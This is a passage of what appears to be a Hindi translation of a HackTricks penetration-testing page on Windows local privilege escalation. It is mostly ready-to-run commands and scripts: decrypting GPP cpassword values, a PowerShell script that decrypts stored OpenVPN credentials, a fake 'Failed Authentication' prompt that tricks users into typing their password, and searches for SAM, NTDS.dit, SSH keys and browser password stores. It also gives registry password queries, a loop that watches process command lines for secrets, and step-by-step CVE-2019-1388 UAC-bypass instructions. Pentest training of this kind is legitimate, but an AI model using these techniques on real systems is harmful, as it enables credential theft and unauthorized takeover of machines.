### Cached GPP Pasword

KB2928120 से पहले (MS14-025 देखें), कुछ ग्रुप पॉलिसी प्राथमिकताएँ एक कस्टम खाता के साथ कॉन्फ़िगर की जा सकती थीं। यह सुविधा मुख्य रूप से एक समूह के मशीनों पर एक कस्टम स्थानीय प्रशासक खाता डिप्लॉय करने के लिए उपयोग की जाती थी। इस दृष्टिकोण के साथ दो समस्याएँ थीं। पहली बात, क्योंकि ग्रुप पॉलिसी ऑब्जेक्ट्स XML फ़ाइलें SYSVOL में स्टोर की जाती हैं, कोई भी डोमेन उपयोगकर्ता उन्हें पढ़ सकता है। दूसरी समस्या यह है कि इन GPPs में सेट किया गया पासवर्ड डिफ़ॉल्ट कुंजी के साथ AES256-एन्क्रिप्टेड है, जो सार्वजनिक रूप से दस्तावेज़ किया गया है। इसका मतलब है कि कोई भी प्रमाणित उपयोगकर्ता संभावित रूप से बहुत संवेदनशील डेटा तक पहुंच सकता है और अपने या अपने मशीन या डोमेन पर अपनी प्रबलता को उन्नत कर सकता है। यह फ़ंक्शन यह जांचेगा कि क्या कोई स्थानीय रूप से कैश किया गया GPP फ़ाइल एक गैर-खाली "cpassword" फ़ील्ड शामिल करती है। अगर हां, तो यह इसे डिक्रिप्ट करेगा और एक कस्टम पीएस ऑब्ज
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
क्रैकमैपेक्जेक का उपयोग करके पासवर्ड प्राप्त करना:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
वेब.कॉन्फ़िग का उदाहरण प्रमाणपत्र:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### प्रमाणीकरण के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके प्रमाणीकरण या यदि आपको लगता है कि वह उन्हें जान सकता है, तो एक विभिन्न उपयोगकर्ता के प्रमाणीकरण के लिए पूछ सकते हैं** (ध्यान दें कि **प्रमाणीकरण** के लिए ग्राहक से सीधे **पूछना** वास्तव में **जोखिमपूर्ण** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **क्रेडेंशियल्स रखने वाले संभावित फ़ाइल नाम**

जानी जाने वाली फ़ाइलें जिनमें कभी **पासवर्ड** **साफ-टेक्स्ट** या **Base64** में रखे गए थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
आवेदित सभी फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### क्रेडेंशियल्स रीसाइकल बिन में

आपको इसे देखने के लिए बिन भी जांचना चाहिए कि इसमें क्रेडेंशियल्स हैं।

**कई प्रोग्राम्स द्वारा सहेजे गए पासवर्ड पुनर्प्राप्त करने** के लिए आप इस्तेमाल कर सकते हैं: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### रजिस्ट्री के अंदर

**क्रेडेंशियल्स के साथ अन्य संभावित रजिस्ट्री कुंजी**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**रजिस्ट्री से openssh कुंजियाँ निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको जाँच करनी चाहिए कि क्या **Chrome या Firefox** से पासवर्ड संग्रहीत हैं।\
इसके अलावा, ब्राउज़रों के इतिहास, बुकमार्क और पसंदीदा जाँचें ताकि कहीं **पासवर्ड संग्रहीत** हो सकें।

ब्राउज़रों से पासवर्ड निकालने के लिए उपकरण:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)\*\*\*\*

### **COM DLL अधिकलेखन**

**Component Object Model (COM)** एक प्रौद्योगिकी है जो Windows ऑपरेटिंग सिस्टम के भीतर निर्मित है जो विभिन्न भाषाओं के सॉफ्टवेयर घटकों के बीच **अंतरसंचार** की अनुमति देती है। प्रत्येक COM घटक **एक कक्षा आईडी (CLSID)** द्वारा पहचाना जाता है और प्रत्येक घटक एक या एक से अधिक इंटरफेस के माध्यम से कार्यक्षमता प्रकट करता है, जिन्हें इंटरफेस आईडी (IIDs) द्वारा पहचाना जाता है।

COM कक्षाएँ और इंटरफेस रजिस्ट्री में **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और **HKEY\_**_**CLASSES\_**_**ROOT\Interface** में परिभाषित की जाती हैं। यह रजिस्ट्री **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** को मिलाकर बनाई जाती है = **HKEY\_**_**CLASSES\_**_**ROOT**।

इस रजिस्ट्री के CLSIDs के अंदर आपको एक चाइल्ड रजिस्ट्री **InProcServer32** मिलेगा जिसमें एक **डिफ़ॉल्ट मान** होता है जो एक **DLL** को इंडिकेट करता है और एक मान जिसे **ThreadingModel** कहा जाता है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single या Multi) या **Neutral** (Thread Neutral) हो सकता है।

![](<../../.gitbook/assets/image (638).png>)

आम तौर पर, यदि आप किसी भी DLL को **अधिकलेखन** कर सकते हैं जो किसी अन्य उपयोगकर्ता द्वारा निष्पादित किया जाएगा, तो आप यदि वह DLL उपयोगकर्ता द्वारा निष्पादित होने जा रहा है तो **वरदान उन्नति** कर सकते हैं।

हमें यह जानने के लिए कि हमलावादी कैसे COM Hijacking का उपयोग स्थायित्व तंत्र के रूप में करते हैं देखने के लिए चेक करें:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **फ़ाइलों और रजिस्ट्री में सामान्य पासवर्ड खोज**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**एक निश्चित फ़ाइल नाम के लिए फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नाम और पासवर्ड खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### उपकरण जो पासवर्ड खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** प्लगइन है जिसे मैंने इस प्लगइन को बनाया है ताकि **हर metasploit POST मॉड्यूल को स्वचालित रूप से निष्पादित किया जा सके जो पीड़ित के अंदर पासवर्ड खोजता है**।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से इस पृष्ठ में उल्लिखित पासवर्ड वाले सभी फ़ाइलों की खोज करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और शानदार उपकरण है जो सिस्टम से पासवर्ड निकालने में मदद करता है।

उपकरण [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **सत्र**, **उपयोगकर्ता नाम** और **पासवर्ड** की खोज करता है कई उपकरणों के लिए जो इस डेटा को स्पष्ट पाठ में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## लीक हैंडलर्स

सोचिए कि **एक प्रक्रिया जो सिस्टम के रूप में चल रही है एक नई प्रक्रिया खोलती है** (`OpenProcess()`) **पूर्ण पहुंच के साथ**। उसी प्रक्रिया **एक नई प्रक्रिया बनाती है** (`CreateProcess()`) **कम विशेषाधिकारों के साथ लेकिन मुख्य प्रक्रिया के सभी खुले हैंडल्स को विरासत में लेती है**।\
फिर, अगर आपके पास **कम विशेषाधिकार वाली प्रक्रिया के लिए पूर्ण पहुंच है**, तो आप **खुले हैंडल को प्राप्त कर सकते हैं जो उच्च विशेषाधिकार वाली प्रक्रिया ने बनाई** है `OpenProcess()` और **एक शैलकोड डाल सकते हैं**।\
[**इस वंशानुक्रम को कैसे पता लगाना और इस कमजोरी का शोधन करने और उसका शोषण करने के बारे में अधिक जानकारी के लिए इस उदाहरण को पढ़ें**](leaked-handle-exploitation.md)\
[**विभिन्न स्तरों की अनुमतियों के साथ विरासत में मिली प्रक्रियाओं और धागों के अधिक खुले हैंडल्स का परीक्षण और दुरुपयोग कैसे करें के बारे में एक अधिक पूर्ण व्याख्या के लिए इस **अन्य पोस्ट को पढ़ें**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## नेम्ड पाइप क्लाइंट अनुरूपण

`पाइप` एक साझा स्मृति खंड है जिसका उपयोग प्रक्रियाएँ संचार और डेटा विनिमय के लिए कर सकती हैं।

`नेम्ड पाइप्स` एक विंडोज तंत्र है जो दो असंबंधित प्रक्रियाओं को एक-दूसरे के बीच डेटा विनिमय करने की अनुमति देता है, भले ही प्रक्रियाएँ दो विभिन्न नेटवर्कों पर स्थित हों। यह क्लाइंट/सर्वर संरचना के लिए बहुत समान है क्योंकि `नेम्ड पाइप सर्वर` और `नेम्ड पाइप क्लाइंट` जैसी धारणाएँ मौजूद हैं।

जब **क्लाइंट पाइप पर लिखता है**, तो पाइप बनाने वाला **सर्वर** जो पाइप बनाया है, **अगर उसके पास SeImpersonate विशेषाधिकार है तो क्लाइंट का अनुरूपण कर सकता है**। फिर, अगर आप **उसे अनुरूपित कर सकते हैं जो किसी पाइप पर लिखने जा रही उच्च विशेषाधिकार वाली प्रक्रिया है**, तो आप उस प्रक्रिया को अनुरूपित करके **विशेषाधिकारों को उन्नत कर सकते हैं**। [**इस हमला कैसे करने के लिए यह पढ़ें**](named-pipe-client-impersonation.md) **या** [**यह**](./#from-high-integrity-to-system)**।**

**इसके अलावा निम्नलिखित उपकरण एक नेम्ड पाइप संचार को एक उपकरण जैसे बर्प के साथ आंतरण करने की अनुमति देता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह उपकरण सभी पाइपों को सूचीबद्ध करने और देखने की अनुमति देता है ताकि प्रिवेस्क्स को खोजने में मदद मिले** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## विविध

### **पासवर्ड के लिए कमांड लाइन की निगरानी**

जब एक उपयोगकर्ता के रूप में शैल मिलता है, तो निर्धारित कार्य या अन्य प्रक्रियाएं निष्पादित की जा रही हो सकती हैं जो **कमांड लाइन पर क्रेडेंशियल्स पारित** करती हैं। नीचे दिया गया स्क्रिप्ट प्रति दो सेकंड में प्रक्रिया कमांड लाइन को कैप्चर करता है और वर्तमान स्थिति को पिछली स्थिति के साथ तुलना करता है, किसी भी अंतर को आउटपुट करता है।
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## निम्न अधिकारी उपयोगकर्ता से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC बायपास

यदि आपके पास ग्राफिकल इंटरफेस तक पहुंच है (कंसोल या आरडीपी के माध्यम से) और UAC सक्षम है, तो कुछ संस्करणों में माइक्रोसॉफ्ट विंडोज में एक टर्मिनल या "NT\AUTHORITY SYSTEM" जैसी किसी अन्य प्रक्रिया को अनविशेषित उपयोगकर्ता से चलाना संभव है।

इससे यह संभव होता है कि विशेषाधिकारों को उन्नत किया जा सके और एक ही समय में एक ही सुरक्षा दुरुपयोग को छलना किया जा सके। इसके अतिरिक्त, कुछ भी स्थापित करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया जाने वाला बाइनरी, माइक्रोसॉफ्ट द्वारा हस्ताक्षरित और जारी किया गया है।

कुछ प्रभावित सिस्टम निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस वंरूपता का शोषण करने के लिए, निम्नलिखित कदम निष्पादित करना आवश्यक है:

```
1) HHUPD.EXE फ़ाइल पर दायाँ क्लिक करें और इसे व्यवस्थापक के रूप में चलाएं।

2) UAC प्रॉम्प्ट प्रकट होने पर, "अधिक विवरण दिखाएं" का चयन करें।

3) "प्रकाशक प्रमाणपत्र जानकारी दिखाएं" पर क्लिक करें।

4) यदि सिस्टम वंरूपनशील है, तो "जारी किया गया" URL लिंक पर क्लिक करने पर, डिफ़ॉल्ट वेब ब्राउज़र प्रकट हो सकता है।

5) साइट को पूरी तरह से लोड होने का इंतजार करें और "इसे बचाएं" का चयन करें ताकि एक explorer.exe विंडो प्रकट हो।

6) एक्सप्लोरर विंडो के पते मार्ग में, cmd.exe, powershell.exe या किसी अन्य इंटरैक्टिव प्रक्रिया दर्ज करें।

7) अब आपके पास "NT\AUTHORITY SYSTEM" कमांड प्रॉम्प्ट होगा।

8) अपने डेस्कटॉप पर वापस आने के लिए सेटअप और UAC प्रॉम्प्ट को रद्द करना न भूलें।
```

आपके पास इस GitHub रिपॉजिटरी में सभी आवश्यक फ़ाइलें और जानकारी है:

https://github.com/jas502n/CVE-2019-1388

## व्यवस्थापक मीडियम से उच्च अखंडता स्तर / UAC बायपास

**अखंडता स्तर के बारे में जानने के लिए यह पढ़ें**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

फिर **UAC और UAC बायपास के बारे में जानने के लिए यह पढ़ें**:

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **उच्च अखंडता से सिस्टम तक**

### **नई सेवा**

यदि आप पहले से ही उच्च अखंडता प्रक्रिया पर चल रहे हैं, तो **सिस्टम तक पहुंचना** आसान हो सकता है बस **एक नई सेवा बनाकर और क्रियान्वयन करके**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

एक उच्च अवधारणा प्रक्रिया से आप **AlwaysInstallElevated रजिस्ट्री एंट्री** को सक्षम करने की कोशिश कर सकते हैं और एक _**.msi**_ रैपर का उपयोग करके एक रिवर्स शैल इंस्टॉल कर सकते हैं।\
[यहां रजिस्ट्री कुंजियों और कैसे एक _.msi_ पैकेज इंस्टॉल करें के बारे में अधिक जानकारी](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**यहां कोड पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वह टोकन विशेषाधिकार हैं (संभावना है कि आप इसे पहले से ही उच्च अवधारणा प्रक्रिया में पाएंगे), तो आप **सीडीबग विशेषाधिकार के साथ लगभग किसी भी प्रक्रिया को खोल सकेंगे** (संरक्षित प्रक्रियाएं नहीं) , **प्रक्रिया का टोकन कॉपी** करें, और उस टोकन के साथ **एक असंवेदनशील प्रक्रिया बना सकें**।\
इस तकनीक का उपयोग करने से आम तौर पर **सिस्टम के रूप में चल रही किसी भी प्रक्रिया का चयन किया जाता है जिसमें सभी टोकन विशेषाधिकार होते हैं** (_हाँ, आप सिस्टम प्रक्रियाएं भी पा सकते हैं जिनमें सभी टोकन विशेषाधिकार नहीं होते हैं_).\
**आप** [**यहां प्रस्तावित तकनीक को अमल में लाने वाले कोड का उदाहरण पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

यह तकनीक मीटरप्रेटर द्वारा `getsystem` में उन्नति के लिए उपयोग की जाती है। तकनीक इस पर निर्भर करती है कि **एक पाइप बनाएं और फिर उस पाइप पर लिखने के लिए एक सेवा बनाएं/दुरुपयोग करें**। फिर, पाइप क्लाइंट (सेवा) के टोकन का अनुकरण करने के लिए **`SeImpersonate`** विशेषाधिकार का उपयोग करने वाला **सर्वर** पाइप बनाने वाला होगा जिससे सिस्टम विशेषाधिकार प्राप्त होंगे।\
यदि आप [**नाम पाइप क्लाइंट अनुकरण के बारे में अधिक जानना चाहते हैं तो आपको इसे पढ़ना चाहिए**](./#named-pipe-client-impersonation)।\
यदि आप [**उच्च अवधारणा से सिस्टम तक जाने के लिए नाम पाइप का उपयोग करके कैसे जाएं इसका उदाहरण पढ़ना चाहते हैं तो आपको इसे पढ़ना चाहिए**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **सिस्टम** के रूप में चल रही **प्रक्रिया** द्वारा **लोड** किए जा रहे **एक dll को हाइजैक** कर लेते हैं तो आप उन अनुमतियों के साथ विचारशील कोड को निष्पादित कर सकेंगे। इसलिए Dll Hijacking इस प्रकार की विशेषाधिकार उन्नति के लिए भी उपयोगी है, और, इसके अलावा, यदि उच्च अवधारणा प्रक्रिया से इसे प्राप्त करना बहुत **आसान होगा** क्योंकि इसे **dlls लोड करने के लिए उपयोग किए जाने वाले फोल्डरों पर लेखन अनुमतियाँ** होंगी।\
**आप** [**यहां Dll हाइजैकिंग के बारे में अधिक जान सकते हैं**](dll-hijacking.md)**।**

### **From Administrator or Network Service to System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक मदद

[स्थिर इम्पैक्ट बाइनरी](https://github.com/ropnop/impacket\_static\_binaries)

## उपयोगी उपकरण

**Windows स्थानीय विशेषाधिकार उन्नति वेक्टर्स की खोज करने के लिए सर्वश्रेष्ठ उपकरण:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- मिसकॉन्फिगरेशन और संवेदनशील फ़ाइलें के लिए जांच करें (**[**यहां जांच करें**](../../windows/windows-local-privilege-escalation/broken-reference/)**)। खोजा गया।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित मिसकॉन्फिगरेशन के लिए जांच करें और जानकारी एकत्र करें (**[**यहां जांच करें**](../../windows/windows-local-privilege-escalation/broken-reference/)**)।**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- मिसकॉन्फिगरेशन के लिए जांच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP सहेजे गए सत्र सूचना निकालता है। स्थानीय में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- क्रेडेंशियल मैनेजर से क्रेडेंशियल निकालता है। खोजा गया।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- डोमेन के लिए एकत्रित पासवर्ड स्प्रे**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS स्पूफर और मैन-इन-द-मिडल उपकरण है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- मूल विशेषाधिकार Windows जांच**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात विशेषाधिकार दुरुपयोगों की खोज करें (Watson के लिए अप्रचलित)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- स्थानीय जांच **(व्यवस्थापक अधिकार चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात विशेषाधिकार दुरुपयोगों की खोज करें (VisualStudio का उपयोग करके कंपाइल करने की आवश्यकता है) ([**पूर्व-कंपाइल**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- मिसकॉन्फिगरेशन की खोज के लिए होस्ट की जांच करता है (एक जानकारी एकत्र करने वाला उपकरण है जो विशेषाधिकार से अधिक है) (कंपाइल करने की आवश्यकता है) **(**[**पूर्व-कंपाइल**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत सारे सॉफ्टवेयर से क्रेडेंशियल निकालता है (github में पूर्व-कंपाइल एक्से)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- C# में PowerUp का पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- मिसकॉन्फिगरेशन की जांच करें (github में पूर्व-कंपाइल एक्सेक्यूटेबल)। सिफारिश नहीं की जाती। यह विंडोज 10 में अच्छे से काम नहीं करता है।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित मिसकॉन्फिगरेशन की जांच करें (पायथन से exe)। सिफारिश नहीं की जाती। यह विंडोज 10 में अच्छे से काम नहीं करता है।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित उपकरण बनाया गया है (यह सही ढंग से काम करने के लिए एक्सेसचेक की आवश्यकता नहीं है लेकिन यह उपयोग कर सकता है)।

**स्थानीय**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** का आउटपुट पढ़ता है और काम करने वाले दुरुपयोगों
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करना चाहते हैं? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
